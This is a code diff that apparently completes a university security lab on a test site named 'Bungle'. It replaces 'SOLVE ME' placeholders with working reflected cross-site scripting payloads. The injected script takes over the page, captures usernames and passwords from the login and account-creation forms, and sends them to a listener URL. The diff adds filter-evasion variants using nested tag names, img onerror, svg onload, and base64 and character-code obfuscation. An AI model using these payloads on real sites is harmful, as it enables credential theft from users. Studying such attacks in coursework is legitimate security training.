@@ -31,13 +31,42 @@ function payload(attacker) {
 					proxy('./', attacker);
 				});
 			});
-
+			$('#new-account-btn').click(function(event) {
+				event.preventDefault();
+				$.get(spying_url + '/stolen', {event: 'login', user: $('#username').val(), pass: $('#userpass').val()});
+				$.post('http://bungle-cs461.csl.illinois.edu/create', {username: $('#username').val(), password: $('#userpass').val()}, function() {
+					proxy('./', attacker);
+				});
+			});
 		});
 	}
 	//Call Proxy
 	proxy('./', attacker)
 }
 
+function payload(attacker) {
+	function proxy(href, spying_url) {
+		$('html').hide();
+		$('html').load(href, function() {
+			$('html').show();
+			$('#log-in-btn').click(function(event) {
+				event.preventDefault();
+				$.get(spying_url + '/stolen', {event: 'login', user: $('#username').val(), pass: $('#userpass').val()});
+				$.post('http://bungle-cs461.csl.illinois.edu/login', {username: $('#username').val(), password: $('#userpass').val()}, function() {
+					proxy('./', attacker);
+				});
+			});
+			$('#new-account-btn').click(function(event) {
+				event.preventDefault();
+				$.get(spying_url + '/stolen', {event: 'login', user: $('#username').val(), pass: $('#userpass').val()});
+				$.post('http://bungle-cs461.csl.illinois.edu/create', {username: $('#username').val(), password: $('#userpass').val()}, function() {
+					proxy('./', attacker);
+				});
+			});
+		});
+	}
+	proxy('./', attacker)
+}
 function makeLink(target, attacker, defense) {
 
 	// Encode your payload function as a string 
@@ -58,16 +87,47 @@ function makeLink(target, attacker, defense) {
 				);
 		case 3:
 			// TODO: generate XSS URL for defense level 2.2.3.3
-			return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+			return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+				encodeURIComponent(
+					("<script>" +
+					payload_string + 
+					";payload('http://127.0.0.1:31337');" +
+					"</" + "script" + ">").replace(/script/g,"sscriptcript")
+				);
 		case 4:
 			// TODO: generate XSS URL payload for defense level 2.2.3.4
-			return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+			return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+				encodeURIComponent(
+					("<img src=fsdafas onerror=\"" +
+					payload_string + 
+					";payload('http://127.0.0.1:31337');" +
+                                                "\">")
+				);
 		case 5:
 			// TODO: generate XSS URL payload for defense level 2.2.3.5
-			return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            var to_run = payload_string+";payload('http://127.0.0.1:31337');";
+            var encoded = btoa(to_run);
+            var real_payload = "eval(atob(\""+encoded+"\"))";
+			return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+				encodeURIComponent(
+                                            "<svg/onload=("+real_payload+")>"
+                                        );
+
 		case 6:
 			// TODO: generate XSS URL payload for defense level 2.2.3.6
-			return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            var to_run = payload_string+";payload('http://127.0.0.1:31337');";
+            var encoded = btoa(to_run);
+            var charcode = "String.fromCharCode(";
+            for(var i=0;i<encoded.length;i++){
+                charcode+=encoded.charCodeAt(i);
+                charcode+=',';
+                                    }
+                        charcode+=")";
+            var real_payload = "eval(atob(\""+charcode+"\"))";
+			return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+				encodeURIComponent(
+                                            "<svg/onload=("+real_payload+")>"
+                                        );
 	}
 }
 
@@ -94,5 +154,6 @@ $(function() {
 	<h3 id="defense4"></h3>
 	<h3 id="defense5"></h3>
 	<h3 id="defense6"></h3>
+    <!--<svg/onload=(function(aa){alert('aa')})()>-->
 </body>
 </html>
